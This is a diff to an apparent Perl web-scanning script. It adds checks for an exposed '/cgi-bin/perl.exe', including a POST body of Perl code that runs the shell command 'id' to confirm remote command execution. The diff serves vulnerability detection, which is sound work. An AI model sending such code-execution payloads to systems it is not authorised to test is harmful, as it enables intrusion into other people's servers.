@@ -26,6 +26,21 @@ my $fragment = $uri_obj->fragment;
 my $url = "$scheme://$ip:$port$path_query"; # including port makes parsing easier
 my $req;
 my $res;
+my @checks = (
+	{
+		name => "perl_minus_v",
+		url => '/cgi-bin/perl.exe?-v',
+		re  => 'Larry Wall',
+		method => 'GET'
+	},
+	{
+		name => "perl_cmd_exec",
+		url => '/cgi-bin/perl.exe',
+		re  => 'uid=.*gid=',
+		method => 'POST',
+		body => "print \"Content-type: text/html\\n\\n\";\nprint \`id\`;"
+	},
+);
 
 print "[+] Canonicalised URL: $url_dirty -> $url\n";
 
@@ -77,6 +92,27 @@ output_info($url, "homepage_content_b64", $res->content);
 output_info($url, "homepage_headers_b64", $res->headers->as_string);
 if (defined($hp_system_management_version)) {
        output_info($url, "hp_system_management_version", $hp_system_management_version);
+}
+
+foreach my $check (@checks) {
+	my $new_url = $url . $check->{url};
+	my %body = ();
+	if ($check->{method} eq "GET") {
+		$req = HTTP::Request->new($check->{method} => $new_url, %body);
+	}
+	if ($check->{method} eq "POST") {
+		if (defined($check->{body})) {
+			$req = HTTP::Request->new("POST", $new_url, undef, $check->{body});
+		} else {
+			$req = HTTP::Request->new("POST", $new_url);
+		}
+	}
+	$res = $ua->request($req);
+	if ($res->as_string =~ /$check->{re}/) {
+		printf "[I] Vulnerable\t%s\t%s\t%s\t%s\n", $check->{name}, $new_url, encode_base64($req->as_string, ""), encode_base64($res->as_string, "");
+	} else {
+		printf "[-] Not vulnerable\t%s\t%s\n", $check->{name}, $new_url;
+	}
 }
 
 sub output_info {
